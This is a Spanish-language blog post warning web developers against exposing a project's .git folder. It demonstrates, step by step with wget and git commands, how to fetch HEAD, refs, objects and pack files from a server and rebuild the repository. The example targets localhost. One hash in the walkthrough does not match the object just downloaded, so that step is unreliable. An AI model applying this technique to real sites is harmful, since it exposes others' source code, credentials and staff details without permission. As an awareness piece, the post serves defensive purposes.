---
layout: post

title: Repositorios expuestos 馃攼
subtitle: Reconstruye un repositorio a partir de una carpeta git p煤blica.

tags: [GIT, Informaci贸n, Seguridad, WEB]

thumbnail-img: /assets/img/git-logo.png
cover-img: /assets/img/spongebob-crying.webp
---

## Cuidado con tu .git 馃攼

No restringir el acceso a la carpeta
**.git** de tu proyecto puede no ocasionar realmente ning煤n inconveniente si es un repositorio publico, pero, 驴y si es un repositorio privado?

Supongamos que tenemos un proyecto publicado en un servidor web en [localhost]() y no existen restricciones de acceso a la carpeta **.git** .

Si por ejemplo almacenas informaci贸n delicada en el repositorio, archivos de configuraci贸n o tienes scripts php que puedan modificar informaci贸n sin comprobar la identidad del usuario, entonces est谩s exponiendo al completo la integridad de tu proyecto.

<img src="/assets/img/spongebob-fire.gif" style="zoom: 67%;" />

**Veamos un ejemplo (sin herramientas externas):**


### Tabla de Contenidos

1. [Preparaci贸n :fire:](#preparaci贸n)
2. [Archivos clave :eyes:](#archivos-clave-git)
   1. [HEAD :memo:](#head)
   2. [master :memo:](#master)
   3. [packs :card_file_box:](#packs)
3. [Descargar todo :ambulance:](#descargar-todo)
<br>

#### Preparaci贸n 

Primero, es necesario crear una estructura de un repositorio vac铆o en local, para acomodar la informaci贸n que se obtiene del servidor.

En este caso el repositorio vac铆o se crea en una carpeta llamada pruebaGit.

`mkdir pruebaGit`

`cd pruebaGit`

`git init`
<br>

#### Archivos clave GIT

Para obtener la informaci贸n del servidor, se lleva a cabo una recogida de archivos clave de Git.

- HEAD
- objects/\*\*/\*
- objects/info/packs
- objects/pack/\*.pack
- objects/pack/\*.idx
- refs/heads/master
- [Existen m谩s]

<br>

##### HEAD

Se obtiene el archivo **HEAD** mediante la herramienta **wget** para ver qu茅 rama del proyecto de est谩 utilizando.

```bash
$wget http://localhost/.git/HEAD

$cat HEAD
ref: refs/heads/master
```

Se observa como el servidor devuelve el contenido de HEAD dando a conocer el nombre y ubicaci贸n del identificador de la rama,
en este caso el nombre de la rama es **master**, y est谩 situada en **/refs/heads/**.

<br>

##### master


```bash
$wget http://localhost/.git/refs/heads/master

$cat master
44a5c422631838b49b9812caef6caeb0176cdaf7
```

El contenido es un SHA1 que identifica el objeto del 煤ltimo commit que se haya realizado en la rama.

El primer byte **44** es una carpeta y los siguientes 19 bytes **a5c422631838b49b9812caef6caeb0176cdaf7** es el nombre del archivo que contine la informaci贸n del commit.

Si se realiza una petici贸n a la direcci贸n compuesta por este identificador, **.git/objects/44/a5c422631838b49b9812caef6caeb0176cdaf7**, se obtiene el 煤ltimo commit registrado.

Para leer su contenido, es necesario mover el archivo al directorio que corresponde en el repositorio local para despu茅s utilizar la herramienta nativa de **git**, `git cat-file -p`.

```bash
$mkdir .git/objects/44

$wget http://localhost/.git/objects/44/a5c422631838b49b9812caef6caeb0176cdaf7 
-O .git/objects/44/a5c422631838b49b9812caef6caeb0176cdaf7

$git cat-file -p e467e96d66ded9ccac4c5b13699ed1735a419a88
tree 70fa54e41234592f3d9969dfa1670aae75671baf
author Nontre <nontre@nontre.es> 1642869168 +0000
committer Nontre <nontre@nontre.es> 1642869168 +0000

Init
```

La informaci贸n que facilita el commit puede ser muy delicada, ya que se puede ver informaci贸n de algunos empleados, como su nombre y direcci贸n de correo.

En este caso, interesa el apartado **tree** del commit.

Si se realiza una petici贸n a la direcci贸n compuesta con el SHA1 de tree, **.git/objects/70/fa54e41234592f3d9969dfa1670aae75671baf**, se obtiene el 谩rbol de ficheros y carpetas del c贸digo fuente del proyecto.

```bash
$mkdir .git/objects/70

$wget http://localhost/.git/objects/70/fa54e41234592f3d9969dfa1670aae75671baf 
-O .git/objects/70/fa54e41234592f3d9969dfa1670aae75671baf

$git cat-file -p 70fa54e41234592f3d9969dfa1670aae75671baf
100644 blob e69de29bb2d1d6434b8b29ae775ad8c2e48c5391    .htaccess
040000 tree d564d0bc3dd917926892c55e3706cc116d5b165e    admin
040000 tree d564d0bc3dd917926892c55e3706cc116d5b165e    css
100644 blob e69de29bb2d1d6434b8b29ae775ad8c2e48c5391    index.php
040000 tree d564d0bc3dd917926892c55e3706cc116d5b165e    js
040000 tree d564d0bc3dd917926892c55e3706cc116d5b165e    lib
```
<br>

##### packs

Muchas veces es posible que al intentar obtener el contenido de cualquier archivo, el servidor devuelva 404.

Git trabaja tambi茅n empaquetando el c贸digo en paquetes, por lo que desempaquetando los archivos **.pack** obtendremos objetos que no se encontraban en la carpeta objects.

Para conocer el nombre de los packs en el servidor, git almacena sus nombres en **.git/objects/info/packs**.

```bash
$wget http://localhost/.git/objects/info/packs

$cat packs
P pack-ea121caa3a973b9b2ecefdf8278c47dc906f36b6.pack
```
En este caso, existe un archivo pack.

<br>

Estos packs se almacenan en **.git/objects/pack/**.

```bash
$wget http://localhost/.git/objects/pack/pack-ea121caa3a973b9b2ecefdf8278c47dc906f36b6.pack

$wget http://localhost/.git/objects/pack/pack-ea121caa3a973b9b2ecefdf8278c47dc906f36b6.idx

$git count-objects
3 objects, 12 kilobytes

$git unpack-objects -r < pack-ea121caa3a973b9b2ecefdf8278c47dc906f36b6.pack
Desempaquetando objetos: 100% (18755/18755), 82.92 MiB | 5.14 MiB/s, listo.

$git count-objects
18758 objects, 161648 kilobytes
```

Antes de desempaquetar, cont谩bamos con tan solo **3 objetos** (los obtenidos anteriormente).
Despu茅s de desempaquetar, el repositorio local cuenta con unos **18758 objetos** obtenidos del servidor remoto.
Estos objetos son **commits, archivos y directorios**.
<br>
#### Descargar todo

Si por ejemplo quisieras descargar todo el repositorio, lo primero que necesitas hacer es un `git checkout -- .` , este comando intentar谩 reconstruir todos los archivos del repositorio a trav茅s de los objetos que se han importado del servidor.

Probablemente muchos objetos no se puedan recuperar y tendr谩s que intentar descargarlos manualmente.

<img src="/assets/img/spongebob-cursed.png" style="zoom:33%;" />